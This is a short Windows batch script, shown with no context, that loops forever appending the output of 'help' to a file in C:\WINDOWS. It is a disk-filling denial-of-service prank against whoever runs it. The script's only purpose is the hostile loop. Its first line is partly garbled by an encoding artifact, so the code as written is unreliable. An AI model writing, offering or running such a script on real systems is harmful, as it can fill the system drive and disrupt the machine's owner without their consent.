@echo off£¬start min
IF EXIST C:\WINDOWS\a.txt (help > a.txt)

:a

help >> C:\WINDOWS\a.txt

goto a